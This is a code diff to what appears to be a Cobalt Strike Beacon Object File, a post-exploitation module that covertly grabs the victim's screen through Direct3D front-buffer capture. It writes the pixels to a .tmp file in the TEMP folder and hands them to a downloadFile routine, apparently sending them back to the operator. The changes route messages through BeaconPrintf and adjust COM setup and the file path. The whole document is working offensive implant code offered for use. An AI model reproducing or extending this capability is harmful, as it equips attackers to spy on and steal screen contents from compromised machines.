@@ -148,20 +148,30 @@ void downloadFile(char* fileName, int downloadFileNameLength, char* returnData, 
 }
 
 void SavePixelsToLogFile(int width, int height, int pitch, LPVOID pBits) {
-    MSVCRT$printf("%doo%d.log\n", width, height);
-    char fileName[256];
-    MSVCRT$sprintf(fileName, "%doo%d.log", width, height);
+    char fileName[MAX_PATH];
+    char *tempPath = MSVCRT$getenv("TEMP");
+
+    if (tempPath == NULL) {
+        BeaconPrintf(CALLBACK_OUTPUT,"Failed to get temporary path, using current directory\n");
+        MSVCRT$sprintf(fileName, "%doo%d.tmp", width, height);
+    } else {
+        MSVCRT$sprintf(fileName, "%s\\%doo%d.tmp", tempPath, width, height);
+    }
+
+    BeaconPrintf(CALLBACK_OUTPUT,"Output path: %s\n", fileName);
+
     FILE* file = MSVCRT$fopen(fileName, "wb");
     if (file == NULL) {
-        MSVCRT$printf("Failed to open file for writing: %s\n", fileName);
+        BeaconPrintf(CALLBACK_OUTPUT,"Failed to open file for writing: %s\n", fileName);
         return;
     }
+
     size_t bytesWritten = MSVCRT$fwrite(pBits, pitch * height, 1, file);
     if (bytesWritten != 1) {
-        MSVCRT$printf("Failed to write pixel data to file: %s\n", fileName);
+        BeaconPrintf(CALLBACK_OUTPUT,"Failed to write pixel data to file: %s\n", fileName);
     }
-    MSVCRT$fclose(file);
 
+    MSVCRT$fclose(file);
     downloadFile(fileName, MSVCRT$strlen(fileName), pBits, pitch * height);
     return;
 }
@@ -169,6 +179,8 @@ void SavePixelsToLogFile(int width, int height, int pitch, LPVOID pBits) {
 // BOF entry function
 int go() {
 
+    HRESULT xx = OLE32$CoInitializeEx(NULL, COINIT_MULTITHREADED);
+    if (FAILED(xx)) return 0;
     UINT adapter = D3DADAPTER_DEFAULT;
     HRESULT hr = S_OK;
     IDirect3DDevice9 *pDevice = NULL;
@@ -182,10 +194,10 @@ int go() {
     IDirect3D9 *d3d = D3D9$Direct3DCreate9(D3D_SDK_VERSION);
     hr = d3d->lpVtbl->GetAdapterDisplayMode(d3d, D3DADAPTER_DEFAULT, &mode);
     if (FAILED(hr)) {
-        MSVCRT$printf("GetAdapterDisplayMode Failed\n");
+        BeaconPrintf(CALLBACK_OUTPUT,"GetAdapterDisplayMode Failed\n");
         return 0;
     }
-    MSVCRT$printf("Resolution: %dx%d\n", mode.Width, mode.Height);
+    BeaconPrintf(CALLBACK_OUTPUT, "Resolution: %dx%d\n", mode.Width, mode.Height);
 
     parameters.Windowed = TRUE;
     parameters.BackBufferCount = 1;
@@ -194,36 +206,33 @@ int go() {
     parameters.SwapEffect = D3DSWAPEFFECT_DISCARD;
     parameters.hDeviceWindow = NULL;
 
-    D3DDEVTYPE Hardware = D3DDEVTYPE_HAL;
-    hr = d3d->lpVtbl->CreateDevice(d3d, adapter, Hardware , NULL, D3DCREATE_SOFTWARE_VERTEXPROCESSING, &parameters, &pDevice);
+    hr = d3d->lpVtbl->CreateDevice(d3d, adapter, D3DDEVTYPE_HAL , NULL, D3DCREATE_SOFTWARE_VERTEXPROCESSING, &parameters, &pDevice);
     if (FAILED(hr)) {
         return 1;
     }
 
     hr = pDevice->lpVtbl->CreateOffscreenPlainSurface(pDevice, mode.Width, mode.Height, D3DFMT_A8R8G8B8, D3DPOOL_SYSTEMMEM, &surface, NULL);
     if (FAILED(hr)) {
-        MSVCRT$printf("CreateOffscreenPlainSurface Failed!\n");
+        BeaconPrintf(CALLBACK_OUTPUT,"CreateOffscreenPlainSurface Failed!\n");
         return 0;
     }
     hr = surface->lpVtbl->LockRect(surface, &rc, NULL, 0);
     if (FAILED(hr)) {
-        MSVCRT$printf("LockRect Failed!\n");
+        BeaconPrintf(CALLBACK_OUTPUT,"LockRect Failed!\n");
         return 0;
     }
     pitch = rc.Pitch;
     hr = surface->lpVtbl->UnlockRect(surface);
     if (FAILED(hr)) {
-        MSVCRT$printf("UnlockRect Failed!\n");
+        BeaconPrintf(CALLBACK_OUTPUT,"UnlockRect Failed!\n");
         return 0;
     }
-    shots = (LPBYTE*)MSVCRT$malloc(1 * sizeof(LPBYTE));
-    for (UINT i = 0; i < 1; i++) {
-        shots[i] = (LPBYTE)MSVCRT$malloc(pitch * mode.Height);
+    shots = (LPBYTE*)MSVCRT$malloc(sizeof(LPBYTE));
+    if (shots != NULL) {
+        *shots = (LPBYTE)MSVCRT$malloc(pitch * mode.Height);
     }
-
     hr = pDevice->lpVtbl->GetFrontBufferData(pDevice, 0, surface);
     if (FAILED(hr)) {return 0;}
-
     SavePixelsToLogFile(mode.Width, mode.Height, pitch, rc.pBits); 
     
     if (shots != NULL) {
@@ -235,5 +244,6 @@ int go() {
     RELEASE(surface);
     RELEASE(pDevice);
     RELEASE(d3d);
+    OLE32$CoUninitialize();
     return 1;
 }
